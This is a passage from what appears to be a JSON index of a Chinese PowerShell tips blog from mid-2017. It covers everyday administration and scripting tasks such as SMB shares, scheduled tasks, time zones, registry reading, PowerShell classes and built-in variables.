Files\\WindowsPowerShell\\ModulesC:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\ModulesPS&gt;","link":"/2017/06/07/important-powershell-variables/"},{"title":"PowerShell 技能连载 - 远程创建 SMB 共享","text":"以下几行代码能在远程服务器上创建一个 SMB 共享： 12345678#requires -Version 3.0 -Modules CimCmdlets, SmbShare -RunAsAdministrator$computername = 'Server12'$shareName = 'ScriptExchange'$fullAccess = 'domain\\groupName'$session = New-CimSession -ComputerName $computernameNew-SMBShare -Name $shareName -Path c:\\Scripts -FullAccess $fullAccess -CimSession $sessionRemove-CimSession -CimSession $session 您可以在客户端将该共享映射为一个网络驱动器。请注意这个网络共享是单用户的，所以如果您使用 Administrator 账户做了映射，那么无法在 Windows Explorer 中存取。 123$computername = 'Server12'$shareName = 'ScriptExchange'net use * &quot;\\\\$computername\\$shareName&quot;","link":"/2017/06/08/creating-smb-shares-remotely/"},{"title":"PowerShell 技能连载 - More 命令的现代版替代品","text":"在 PowerShell 控制台中，您仍然可以用 more 管道，就像在 cmd.exe 中一样一页一页查看结果。然而，more 不支持实时管道，所以所有数据需要首先收集好。这将占用很长时间和内存： 1dir c:\\windows -Recurse -ea 0 | more 一个更好的方法是使用 PowerShell 自带的分页功能： 1dir c:\\windows -Recurse -ea 0 | Out-Host -Paging 请注意这些都需要一个真正的控制台窗口，而在图形界面的宿主中不能工作。","link":"/2017/06/09/modern-alternative-to-more/"},{"title":"PowerShell 技能连载 - 查看函数源码","text":"以下是一种快速查看 PowerShell 函数源码的方法： 1${function:Clear-Host} | clip 这将会把 Clear-Host 的源代码复制到剪贴板中，并且当您粘贴它时，您可以看到 Clear-Host 是如何工作的： 12345$RawUI = $Host.UI.RawUI$RawUI.CursorPosition = @{X=0;Y=0}$RawUI.SetBufferContents( @{Top = -1; Bottom = -1; Right = -1; Left = -1}, @{Character = ' '; ForegroundColor = $rawui.ForegroundColor; BackgroundColor = $rawui.BackgroundColor}) 通常可以从这里学到很多东西。如果您想用非空格的字符填充 PowerShell 控制台，例如绿底白字的 ‘X’，请试试这段代码： 123$host.UI.RawUI.SetBufferContents( @{Top = -1; Bottom = -1; Right = -1; Left = -1}, @{Character = 'X'; ForegroundColor = 'Yellow'; BackgroundColor = 'Green'}) 请注意这只能在真正的 PowerShell 控制台宿主中起作用。","link":"/2017/06/12/spying-on-function-source-code/"},{"title":"PowerShell 技能连载 - 在计划任务中运行 PowerShell 脚本","text":"如果您需要以固定的频率运行一段 PowerShell 脚本，何不以计划任务的方式运行它呢？以下是一段帮您新建一个每天上午 6 点执行一个 PowerShell 脚本的计划任务的代码： 1234567891011#requires -Modules ScheduledTasks#requires -Version 3.0#requires -RunAsAdministrator$TaskName = 'RunPSScriptAt6'$User= &quot;train\\tweltner&quot;$scriptPath = &quot;\\\\Server01\\Scripts\\find-newaduser.ps1&quot;$Trigger= New-ScheduledTaskTrigger -At 6:00am -Daily$Action= New-ScheduledTaskAction -Execute &quot;PowerShell.exe&quot; -Argument &quot;-executionpolicy bypass -noprofile -file $scriptPath&quot;Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -User $User -Action $Action -RunLevel Highest -Force","link":"/2017/06/13/running-powershell-script-as-a-scheduled-task/"},{"title":"PowerShell 技能连载 - 查找一个脚本块中的所有变量","text":"要分析一个脚本快中的内容，您可以简单地检查 AST，并且，例如创建一个包含代码中所有变量的清单： 123456789101112131415$code = { $a = &quot;Test&quot; $b = 12 Get-Service Get-Process $berta = 100}$code.Ast.FindAll( { $true }, $true) | Where-Object { $_.GetType().Name -eq 'VariableExpressionAst' } | Select-Object -Property VariablePath -ExpandProperty Extent | Out-GridView 如果您想查看所有的命令，请试试以下代码： 12345678910111213141516$code = { $a = &quot;Test&quot; $b = 12 Get-Service Get-Process $berta = 100}$code.Ast.FindAll( { $true }, $true) | Where-Object { $_.GetType().Name -eq 'CommandAst' } | Select-Object -ExpandProperty Extent | Select-Object -Property * -ExcludeProperty *ScriptPosition | Out-GridView 这在根据脚本块自动生成文档的时候非常有用。","link":"/2017/06/14/finding-all-variables-in-a-script-block/"},{"title":"PowerShell 技能连载 - 查找一个脚本中的所有变量","text":"在前一个技能中我们掩饰了如何分析一段脚本块的内容并且搜索变量或命令。这种技术也适用于基于文本的脚本。以下脚本将会检查自己并且提取出变量和命令： 12345678910111213141516171819$filepath = $PSCommandPath$tokens = $errors = $null$ast = [System.Management.Automation.Language.Parser]::ParseFile($filepath, [ref]$tokens, [ref]$errors )# find variables$ast.FindAll( { $true }, $true) | Where-Object { $_.GetType().Name -eq 'VariableExpressionAst' } | Select-Object -Property VariablePath -ExpandProperty Extent | Select-Object -Property * -ExcludeProperty *ScriptPosition | Out-GridView -Title 'Variables'# find commands$ast.FindAll( { $true }, $true) | Where-Object { $_.GetType().Name -eq 'CommandAst' } | Select-Object -ExpandProperty Extent | Select-Object -Property * -ExcludeProperty *ScriptPosition | Out-GridView -Title 'Commands' 请确保将脚本保存到硬盘，或为 $filepath 指定一个不同的实际存在的脚本路径。","link":"/2017/06/15/finding-all-variables-in-a-script/"},{"title":"PowerShell 技能连载 - 设置时区","text":"只有拥有了管理员特权才可以修改电脑的时间和日期，但任何用户都可以修改时区，例如当您在旅游时。PowerShell 5 提供了一系列非常简单的 cmdlet 来管理时区。首先，检查您的当前设置： 123456789PS&gt; Get-TimeZoneId : W. Europe Standard TimeDisplayName : (UTC+01:00) Amsterdam, Berlin, Bern, Rom, Stockholm, WienStandardName : Mitteleuropäische ZeitDaylightName : Mitteleuropäische SommerzeitBaseUtcOffset : 01:00:00SupportsDaylightSavingTime : True 下一步，尝试修改时区。以下代码打开一个包含所有可用时区的窗口： 1PS&gt; Get-TimeZone -ListAvailable | Out-GridView 当您知道您希望设置的时区的正式 ID 后，请使用 Set-TimeZone 命令。 12345678910111213PS&gt; Set-TimeZone -Id 'Chatham Islands Standard Time'PS&gt; Get-DateSamstag, 27. Mai 2017 18:32:53PS&gt; Set-TimeZone -Id 'W. Europe Standard Time'PS&gt; Get-DateSamstag, 27. Mai 2017 07:48:02","link":"/2017/06/16/setting-time-zone/"},{"title":"PowerShell 技能连载 - 检查夏时制","text":"以下用 PowerShell 来查看是否使用了夏时制的方法——进行 GMT 计算时可能需要的细节： 1(Get-Date).IsDaylightSavingTime()","link":"/2017/06/19/check-for-daylight-savings-time/"},{"title":"PowerShell 技能连载 - 世界时钟","text":"PowerShell 提供了 Get-TimeZone 命令，能返回所有定义过的时区和它们的时差。以下是列出世界时钟相关的代码： 123456789101112$isSummer = (Get-Date).IsDaylightSavingTime()Get-TimeZone -ListAvailable | ForEach-Object { $dateTime = [DateTime]::UtcNow + $_.BaseUtcOffset $cities = $_.DisplayName.Split(')')[-1].Trim() if ($isSummer -and $_.SupportsDaylightSavingTime) { $dateTime = $dateTime.AddHours(1) } '{0,-30}: {1:HH:mm&quot;h&quot;} ({2})' -f $_.Id, $dateTime, $cities } 结果类似如下： Dateline Standard Time : 18:41h () UTC-11 : 19:41h (Coordinated Universal Time-11) Aleutian Standard Time : 21:41h (Aleutian Islands) Hawaiian Standard Time : 20:41h (Hawaii) Marquesas Standard Time : 21:11h (Marquesas Islands) Alaskan Standard Time : 22:41h (Alaska) UTC-09 : 21:41h (Coordinated Universal Time-09) Pacific Standard Time (Mexico) : 23:41h (Baja California) UTC-08 : 22:41h (Coordinated Universal Time-08) Pacific Standard Time : 23:41h () US Mountain Standard Time : 23:41h (Arizona) Mountain Standard Time (Mexico): 00:41h (Chihuahua, La Paz, Mazatlan) Mountain Standard Time : 00:41h () Central America Standard Time : 00:41h (Central America) Central Standard Time : 01:41h () Easter Island Standard Time : 01:41h (Easter Island) Central Standard Time (Mexico) : 01:41h (Guadalajara, Mexico City, Monterrey) Canada Central Standard Time : 00:41h (Saskatchewan) SA Pacific Standard Time : 01:41h (Bogota, Lima, Quito, Rio Branco) Eastern Standard Time (Mexico) : 02:41h (Chetumal) Eastern Standard Time : 02:41h ()","link":"/2017/06/20/world-time-clock/"},{"title":"PowerShell 技能连载 - 获取端口分配列表","text":"IANA（互联网数字分配机构）维护了一个包含所有已知的端口分配的 CSV 文件。PowerShell 可以为您下载这个列表： 1234$out = &quot;$env:temp\\portlist.csv&quot;$url = 'https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.csv'$web = Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $outImport-Csv -Path $out -Encoding UTF8 返回的结果是一个包含所有的端口分配的面向对象格式的列表。接下来您可以使用这个信息例如过滤特定的端口： 123Import-Csv -Path $out -Encoding UTF8 | Where-Object 'transport protocol' -eq 'tcp' | Where-Object 'Port Number' -lt 1000","link":"/2017/06/21/get-list-of-port-assignments/"},{"title":"PowerShell 技能连载 - 使用缓存的端口文件","text":"在前一个技能中我们介绍了如何用 PowerShell 通过 IANA 下载端口分配信息。这个过程需要 Internet 连接并且需要一段时间。所以以下代码会查找缓存的 CSV 文件。如果缓存文件存在，端口信息会从离线文件中加载，否则将在线加载数据，并写入缓存文件。请特别注意如何使用 Tee-Object 命令创建缓存文件： 12345678910111213141516171819$url = 'https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.csv'$CSVFile = &quot;$env:temp\\ports.csv&quot;$exists = Test-Path -Path $CSVFileif (!$exists){ Write-Warning &quot;Retrieving data online...&quot; $portinfo = Invoke-WebRequest -Uri $Url -UseBasicParsing | ` Select-Object -ExpandProperty Content | ` Tee-Object -FilePath $CSVFile | ConvertFrom-Csv}else{ Write-Warning &quot;Loading cached file...&quot; $portinfo = Import-Csv -Path $CSVFile}$portinfo | Out-GridView","link":"/2017/06/22/using-cached-port-file/"},{"title":"PowerShell 技能连载 - 显示文件夹树","text":"PowerShell 对旧的控制台命令是十分友好的，所以要显示文件夹的树形结构，使用旧的 “tree” 命令是十分简单的。它最好工作在一个原生的 PowerShell 控制台中，因为编辑器往往使用不同的字符集。请试试这个命令： 1PS&gt; Tree $home 请确保您是在一个原生的 PowerShell 控制台中或 VSCode 中运行这段代码。您还可以将结果通过管道输出到 clip.exe 并将它粘贴到一个文本文档中： 1PS&gt; Tree $home | clip.exe","link":"/2017/06/23/displaying-folder-tree/"},{"title":"PowerShell 技能连载 - 清空 DNS 缓存","text":"Windows 使用了 DNS 缓存技术，如果改变了 DNS 服务器，您需要刷新 DNS 缓存以使新的设置生效。PowerShell 对传统的控制台命令是有好的，所以只需要在 PowerShell 中运行这行代码： 1PS&gt; ipconfig /flushdns","link":"/2017/06/26/flush-dns-cache/"},{"title":"PowerShell 技能连载 - 神秘的 Windows 10 透明模式","text":"When you open a native PowerShell console in Windows 10, you can hold down CTRL+SHIFT, then move your mouse wheel, to adjust console background color transparency, and let other windows shine through. The same works for cmd.exe as well, of course.当您在 Windows 10 中打开一个原生的 PowerShell 控制台，按下 CTRL + SHIFT 键，然后滚动鼠标滚轮，就可以调节控制台背景色的透明度，并且让其它窗口的内容透射出来。当然这对 cmd.exe 也是有效的。","link":"/2017/06/27/secret-windows-10-transparency-mode/"},{"title":"PowerShell 技能连载 - PowerShell 中 LINQ 的真实情况","text":"不久前有一些关于 LINQ，一个 .NET 查询语言，在 PowerShell 中用来提升代码速度的报告。 直到 PowerShell 真正支持 Linq 之前，使用 Linq 是非常冗长的，并且需要使用强类型和没有文档的方法。另外，同样的事可以使用纯 PowerShell 方法来做，速度的提升很少——至少对 IPPro 相关的任务不明显。 以下是一个使用很简单的 Linq 语句对数字求和的测试用例。它接受 Windows 文件夹下的所有文件，然后对所有文件的长度求和： 1234567891011121314$numbers = Get-ChildItem -Path $env:windir -File | Select-Object -ExpandProperty Length(Measure-Command { $sum1 = [Linq.Enumerable]::Sum([int[]]$numbers)}).TotalMilliseconds(Measure-Command { $sum2 = ($numbers | Measure-Object -Sum).Sum}).TotalMilliseconds(Measure-Command { $sum3 = 0 foreach ($number in $numbers) { $sum3+=$number }}).TotalMilliseconds 当您运行它多次的时候，您会观察到执行时间的输出。Linq 的方法可以使用，但是对数据类型十分敏感。例如，您需要将数字数组转换为 integer 数组，否则 Linq 的 Sum() 方法将不起作用。 可以提炼出两条法则： 这时不值得使用 Linq，因为它尚未集成到 PowerShell 中，并且会产生难读的代码。它几乎相当于在 PowerShell 使用 C# 源代码。 如果您想提升速度，请在所有可能的地方避免使用管道。foreach 循环的执行速度比用管道将许多对象通过管道传到 ForEach-Object 快许多。 If Linq was better integrated into PowerShell in the future, it would indeed be highly interesting.","link":"/2017/06/28/truth-about-linq-in-powershell/"},{"title":"PowerShell 技能连载 - 每日问候","text":"以下是一个在 PowerShell 中接受一个字符串数组并返回一个随机的字符串，可以用作自定义问候语的简单方法： 12345678$greetings ='Hello there!','Glad to see you!','Happy coding!','Have a great day!','May the PowerShell be with you!'$greetings | Get-Random 您所需要做的只是将这段代码加到您的 profile 脚本，例如这样： 123456789101112131415161718# create profile if it does not yet exist$exists = Test-Path -Path $Profile.CurrentUserAllHostsif (!$exists){ $null = New-Item -Path $Profile.CurrentUserAllHosts -ItemType File -Force}# add code to profile@'$greetings ='Hello there!','Glad to see you!','Happy coding!','Have a great day!','May the PowerShell be with you!'$greetings | Get-Random'@ | Add-Content -Path $Profile.CurrentUserAllHosts -Encoding Default 完成以后，PowerShell 将会使用自定义信息向您问候。","link":"/2017/06/29/greetings-of-the-day/"},{"title":"PowerShell 技能连载 - 每日问候（带语音）","text":"在前一个技能中我们解释了如何在 PowerShell 配置文件中增加个人问候。这个问候信息也可以朗读出来，假设音量打开的情况下。这对所有的 PowerShell 宿主都有效，包括 VSCode。 这将把代码增加到您的配置文件脚本中： 12345678910111213141516171819# create profile if it does not yet exist$exists = Test-Path -Path $Profile.CurrentUserAllHostsif (!$exists){ $null = New-Item -Path $Profile.CurrentUserAllHosts -ItemType File -Force}# add code to profile@'$greetings ='Hello there!','Glad to see you!','Happy coding!','Have a great day!','May the PowerShell be with you!'$text = $greetings | Get-Random$null = (New-Object -COM Sapi.SpVoice).Speak($text)'@ | Add-Content -Path $Profile.CurrentUserAllHosts -Encoding Default 要编辑用户配置文件，请运行这段代码： 1PS&gt; notepad $profile.CurrentUserAllHosts","link":"/2017/06/30/greetings-of-the-day-with-voice/"},{"title":"PowerShell 技能连载 - 读取注册表键值失败","text":"有些时候，读取注册表键值可能会失败，提示奇怪的错误信息： 1234567891011121314PS&gt; $key = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}\\0&quot;PS&gt; Get-ItemProperty -Path $keyGet-ItemProperty : Specified cast is not valid.At line:1 char:1+ Get-ItemProperty -Path $key+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Get-ItemProperty], InvalidCastException + FullyQualifiedErrorId : System.InvalidCastException,Microsoft.PowerShell.Commands.GetItemPropertyComma ndPS&gt; 当发生这种情况时，用 regedit.exe 检查注册表发现一个或多个键值已破坏。在我们的例子中，”lParam” 的值似乎在所有的 Windows 机器中都是错误的。Regedit.exe 报告“(invalid … value)”。 在这个例子中，Get-ItemProperty 指令并不会读出任何值。您无法也排除该值： 12345678910PS&gt; Get-ItemProperty -Path $key -Include * -Exclude lParamGet-ItemProperty : Specified cast is not valid.At line:1 char:1+ Get-ItemProperty -Path $key -Include * -Exclude lParam+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Get-ItemProperty], InvalidCastException + FullyQualifiedErrorId : System.InvalidCastException,Microsoft.PowerShell.Commands.GetItemPropertyCommandPS&gt; 可以采取的措施是只读取合法的键值： 12345678910111213PS&gt; Get-ItemProperty -Path $key -Name DSPathDSPath : LocalGPOPSPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersi on\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}\\0PSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersi on\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}PSChildName : 0PSProvider : Microsoft.PowerShell.Core\\RegistryPS&gt;","link":"/2017/07/03/reading-registry-values-fails/"},{"title":"PowerShell 技能连载 - 读取注册表键值（临时解决办法）","text":"在前一个技能中我们演示了 Get-ItemProperty 无法读取数据错误的注册表键值： 1234567891011121314PS&gt; $key = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}\\0&quot;PS&gt; Get-ItemProperty -Path $keyGet-ItemProperty : Specified cast is not valid.At line:1 char:1+ Get-ItemProperty -Path $key+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Get-ItemProperty], InvalidCastException + FullyQualifiedErrorId : System.InvalidCastException,Microsoft.PowerShell.Commands.GetItemPropertyComma ndPS&gt; 有一个变通办法，您可以使用 Get-Item 代替，来存取注册表键，这将使用它的 .NET 成员来读取所有值： 1234567891011$key = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\{35378EAC-683F-11D2-A89A-00C04FBBCFA2}\\0&quot;$key = Get-Item -Path $key$hash = @{}foreach ($prop in $key.Property){ $hash.$prop = $key.GetValue($prop)}$hash 结果看起来如下： 123456789101112Name Value---- -----Extensions [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{0F6B957E-509E-11D1-A7CC-0000F87571E3}]Link LocalOptions 0GPOLink 1Version 65537GPOName Guidelines of the local grouplParam 0DSPath LocalGPOFileSysPath C:\\WINDOWS\\System32\\GroupPolicy\\MachineDisplayName Guidelines of the local group","link":"/2017/07/04/reading-registry-values-workaround/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 类（一）","text":"从 PowerShell 5 开始，您可以定义类。它们有许多应用场景。一个是为有用的工具函数创建一个库来更好地整理它们。要实现这个功能，这个类要定义一些 “static” 方法。以下是一个简单的例子： 1234567891011121314151617class HelperStuff{ # get first character of string and throw exception # when string is empty or multi-line static [char] GetFirstCharacter([string]$Text) { if ($Text.Length -eq 0) { throw 'String is empty' } if ($Text.Contains(&quot;`n&quot;)) { throw 'String contains multiple lines' } return $Text[0] } # get file extension in lower case static [string] GetFileExtension([string]$Path) { return [Io.Path]::GetExtension($Path).ToLower() }} “HelperStuff” 类定义了 “GetFirstCharacter“ 和 “GetFileExtension“ 两个静态方法。现在查找和使用这些工具函数非常方便： 12345678910PS&gt; [HelperStuff]::GetFirstCharacter('Tobias')TPS&gt; [HelperStuff]::GetFileExtension('c:\\TEST.TxT').txtPS&gt; [HelperStuff]::GetFileExtension($profile).ps1PS&gt;","link":"/2017/07/05/using-powershell-classes/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 类（二）","text":"从 PowerShell 5 开始，您可以定义 PowerShell 类。您可以使用类来创建新对象，并通过创建一个或多个构造函数，您可以方便地初始化新创建的对象。 让我们看看效果： 123456789101112131415161718192021class Employee{ [int]$Id [string]$Name Employee([int]$Id, [string]$Name) { $this.Id = $Id $this.Name = $Name } Employee ([string]$Name) { $this.Id = -1 $this.Name = $Name } Employee () { $this.Id = -1 $this.Name = 'Undefined' }} 这段代码运行后，将创建一个包含三个构造函数的 “Employee” 新类。以下是如何使用新类的方法： 12345678910111213141516171819202122232425PS&gt; [Employee]::new()Id Name-- -----1 UndefinedPS&gt; [Employee]::new('Tobias')Id Name-- -----1 TobiasPS&gt; [Employee]::new(999, 'Tobias') Id Name -- ----999 TobiasPS&gt; 每次调用都使用一个新的构造函数，并且该类根据需要创建相应的对象。","link":"/2017/07/06/using-powershell-classes-2/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 类","text":"从 PowerShell 5 开始，您可以定义 PowerShell 类。它们是动态定义的，并且存在于内存中。那么要如何知道这些类的名字？ 我们首先定义一个简单的，没有任何内容的类： 1234class TestClass{} 如何确认内存中确实存在一个名为 “TestClass” 的类？以下是一个名为 Get-PSClass 的工具函数： 1234567891011function Get-PSClass($Name = '*'){ [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetCustomAttributes($false) | Where-Object { $_ -is [System.Management.Automation.DynamicClassImplementationAssemblyAttribute]} } | ForEach-Object { $_.GetTypes() | Where-Object IsPublic | Where-Object { $_.Name -like $Name } | Select-Object -ExpandProperty Name }} 执行这个函数后，它会返回当前内存中所有定义的 PowerShell 类（在我们的 PowerShell 例子中，在前几个技能实验中有好几个 PowerShell 类）： 123456PS&gt; Get-PSClassHelperStuffEmployeeTestClassPS&gt; 您也可以显示地测试一个类名： 12345678PS&gt; Get-PSClass -Name TestClassTestClassPS&gt; (Get-PSClass -Name TestClass) -ne $nullTruePS&gt; (Get-PSClass -Name TestClassNotExisting) -ne $nullFalse 您也可以使用通配符。一下代码将返回所有以 “A” 至 “H” 字母开头的类： 123PS&gt; Get-PSClass -Name '[A-H]*'HelperStuffEmployee","link":"/2017/07/07/finding-powershell-classes/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 缺省变量（第一部分）","text":"有些时候识别出 PowerShell 管理的缺省变量十分有用，这样能帮您区分内置的变量和自定义的变量。Get-Variable 总是输出所有的变量。 以下是一个简单的技巧，使用一个独立、全新的 PowerShell 运行空间来确定内置的 PowerShell 变量： 12345678910111213# create a new PowerShell$ps = [PowerShell]::Create()# get all variables inside of it$null = $ps.AddCommand('Get-Variable')$result = $ps.Invoke()# dispose new PowerShell$ps.Runspace.Close()$ps.Dispose()# check results$varCount = $result.CountWrite-Warning &quot;Found $varCount variables.&quot;$result | Out-GridView 当您运行这段代码时，该代码输出找到的变量数量，以及这些变量。","link":"/2017/07/10/finding-powershell-default-variables-part-1/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 缺省变量（第二部分）","text":"在前一个技能里我们解释了如何使用独立全新的 PowerShell 实例来获取所有缺省变量。当您仔细查看这些变量，会发现还是丢失了某些变量。 以下是一个稍微修改过的版本，名为 Get-BuiltInPSVariable，能返回所有保留的 PowerShell 变量： 123456789101112function Get-BuiltInPSVariable($Name='*'){ # create a new PowerShell $ps = [PowerShell]::Create() # get all variables inside of it $null = $ps.AddScript('$null=$host;Get-Variable') $ps.Invoke() | Where-Object Name -like $Name # dispose new PowerShell $ps.Runspace.Close() $ps.Dispose()} 为了不遗漏任何一个内置的 PowerShell 变量，这个做法使用了 AddScript() 方法来代替 AddCommand()，来执行多于一条命令。有一些 PowerShell 变量要等待至少一条命令执行之后才创建。 您现在可以获取所有的 PowerShell 内置变量，或搜索指定的变量： 123456789101112PS&gt; Get-BuiltInPSVariable -Name *pref*Name Value---- -----ConfirmPreference HighDebugPreference SilentlyContinueErrorActionPreference ContinueInformationPreference SilentlyContinueProgressPreference ContinueVerbosePreference SilentlyContinueWarningPreference ContinueWhatIfPreference False","link":"/2017/07/11/finding-powershell-default-variables-part-2/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 缺省变量（第三部分）","text":"在前一个技能中我们演示了如何用类似如下的方法来查找内置的 PowerShell 变量： 12345$ps = [PowerShell]::Create()$null = $ps.AddScript('$null=$host;Get-Variable')$ps.Invoke()$ps.Runspace.Close()$ps.Dispose() 显然，这段代码还是漏了一些不是由 PowerShell 核心引擎创建的变量，而是由具体宿主加入的变量，例如 powershell.exe，或者 ISE。这些缺失的变量需要手工添加。幸好不是很多： 12345678910$ps = [PowerShell]::Create()$null = $ps.AddScript('$null=$host;Get-Variable')[System.Collections.ArrayList]$result = $ps.Invoke() | Select-Object -ExpandProperty Name$ps.Runspace.Close()$ps.Dispose()# add host-specific variables$special = 'ps','psise','psunsupportedconsoleapplications', 'foreach', 'profile'$result.AddRange($special) 现在这段代码能够获取包含所有保留 PowerShell 变量的列表，并且如果我们还缺少了某些变量，只需要将它们添加到 $special 列表即可。 顺便说一下，这段代码完美地演示了如何用 [System.Collections.ArrayList] 来创建一个更好的数组。跟常规的 [Object[]] 数组相比，ArrayList 对象拥有例如 AddRange()，能快速批量加入多个元素，等其它方法。","link":"/2017/07/12/finding-powershell-default-variables-part-3/"},{"title":"PowerShell 技能连载 - 清除所有用户变量","text":"在前一个技能中我们演示了如何用类似这样的方法来查找内置的 PowerShell 变量： 12345$ps = [PowerShell]::Create()$null = $ps.AddScript('$null=$host;Get-Variable')$ps.Invoke()$ps.Runspace.Close()$ps.Dispose() 现在我们来做相反的事情，创建一个函数来查找仅由你创建的用户变量： 1234567891011121314151617function Get-UserVariable ($Name = '*'){ # these variables may exist in certain environments (like ISE, or after use of foreach) $special = 'ps','psise','psunsupportedconsoleapplications', 'foreach', 'profile' $ps = [PowerShell]::Create() $null = $ps.AddScript('$null=$host;Get-Variable') $reserved = $ps.Invoke() | Select-Object -ExpandProperty Name $ps.Runspace.Close() $ps.Dispose() Get-Variable -Scope Global | Where-Object Name -like $Name | Where-Object { $reserved -notcontains $_.Name } | Where-Object { $special -notcontains $_.Name } | Where-Object Name} 现在可以很容易查找所有由您（或您的脚本）创建并仍然停留在内存中的变量： 1234567891011121314151617PS&gt; Get-UserVariableName Value---- -----hash {Extensions, Link, Options, GPOLink...}prop lParamreserved {$, ?, ^, args...}result {System.Management.Automation.PSVariable, System.Management.Automation.Ques...varCount 43PS&gt; Get-UserVariable -Name pr*Name Value---- -----prop lParam 如果要清理您的运行空间，您可以用一行代码清除所有变量： 123456789101112131415161718PS&gt; Get-UserVariableName Value---- -----hash {Extensions, Link, Options, GPOLink...}key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\H...prop lParamreserved {$, ?, ^, args...}result {System.Management.Automation.PSVariable, System.Management.Automation.Ques...varCount 43PS&gt; Get-UserVariable | Remove-VariablePS&gt; Get-UserVariablePS&gt;","link":"/2017/07/13/clearing-all-user-variables/"},{"title":"PowerShell 技能连载 - 设置 Powershell 标题文本","text":"您也许知道可以通过类似这样一行代码改变 PowerShell 宿主窗口的标题文本： 1PS&gt; $host.UI.RawUI.WindowTitle = &quot;Hello World!&quot; 如果把这段代码加入 prompt 函数，标题文本就可以每次变化。 1234567891011121314function prompt{ # get current path $path = Get-Location # get current time $date = Get-Date -Format 'dddd, MMMM dd' # create title text $host.UI.RawUI.WindowTitle = &quot;&gt;&gt;$path&lt;&lt; [$date]&quot; # output prompt 'PS&gt; '} PowerShell 每次完成一条命令之后，都会执行 “prompt“ 函数。在标题栏中，您将始终能看到当前的路径和日期，而 PowerShell 编辑器中的命令提示符被简化成 “PS&gt; “。","link":"/2017/07/14/setting-powershell-title-text/"},{"title":"PowerShell 技能连载 - Windows PowerShell 和 PowerShell Core","text":"最近关于 PowerShell 版本有一些混淆。在 GitHub 上有一个名为 “PowerShell 6” 的开源倡议。 这是否意味着开源的 PowerShell 6 是 PowerShell 5 的继任者，并且最终和 Windows 一起发布？ 并不是的。现在只有两个不同的 PowerShell，所谓的 “PowerShell Editions”。 “Windows PowerShell” 就我们所知会持续存在，并且将会随着将来的 Windows 版本发布，对应完整版 .NET Framework。 开源的 PowerShell 6 本意是基于 “PowerShell Core” 工作，这是一个有限的 .NET 子集 (.NET Core)。它的目的是在一个最小化的环境，例如 Nano Server 中运行，并且能够支持 Linux 和 Apple 等不同的平台。 从 PowerShell 5.1 开始，您可以这样检查 “PowerShell Edition”： 12PS&gt; $PSVersionTable.PSEditionDesktop “Desktop” 表示您在完整的 .NET Framework 上运行 “Windows PowerShell”。”Core” 表示您在 .NET Core 上运行 “PowerShell Core”。","link":"/2017/07/17/windows-powershell-and-powershell-core/"},{"title":"PowerShell 技能连载 - 探讨 Windows PowerShell 和 PowerShell Core","text":"PowerShell 当前有两个版本：随 Windows 发布、基于完整 .NET 框架的的 “Windows PowerShell”，以及基于 .NET Core、支持跨平台、能够运行在 Nano Server 等平台的 “PowerShell Core”。 面向某个具体 PowerShell 版本的脚本作者可以使用 #requires 语句来确保他们的脚本运行于指定的版本。 例如，要确保一个脚本运行于 PowerShell Core 中，请将这段代码放在脚本顶部： 12#requires -PSEdition CoreGet-Process 请确保把这段代码保存到磁盘。#requires 只对脚本有效。 当您在 Windows 机器上的 “Windows PowerShell” 中运行这段脚本，将会报错： 123456789PS&gt; C:\\Users\\abc\\requires core.ps1The script 'requires core.ps1' cannot be run because it contained a &quot;#requires&quot; statement for PowerShelleditions 'Core'. The edition of PowerShell that is required by the script does not match the currentlyrunning PowerShell Desktop edition. + CategoryInfo : NotSpecified: (requires core.ps1:String) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : ScriptRequiresUnmatchedPSEditionPS&gt; 类似地，甚至更重要的是，当您将 “Core” 替换为 “Desktop”，脚本将无法在受限的 “PowerShell Core” 版本中运行。如果您的脚本依赖于传统 Windows 系统中的某些特性，并且依赖于完整 .NET Framework，这种做法十分明智。","link":"/2017/07/18/dealing-with-windows-powershell-and-powershell-core/"},{"title":"PowerShell 技能连载 - 查看 PowerShell 当前的文件系统路径","text":"To find out the path your PowerShell is currently using, simply run Get-Location:要查看 PowerShell 的当前路径，只要用 Get-Location 命令即可： 12345PS&gt; Get-LocationPath----C:\\Users\\tobwe 然而，当前路径不一定指向一个文件系统位置。如果您将位置指向注册表，例如这样： 1234567PS&gt; cd hkcu:\\PS&gt; Get-LocationPath----HKCU:\\ 如果您想知道 PowerShell 当前使用的文件系统路径，而不管当前使用什么 provider，请使用以下代码： 1234567891011121314151617181920PS&gt; $ExecutionContext.SessionState.PathCurrentLocation CurrentFileSystemLocation--------------- -------------------------HKCU:\\ 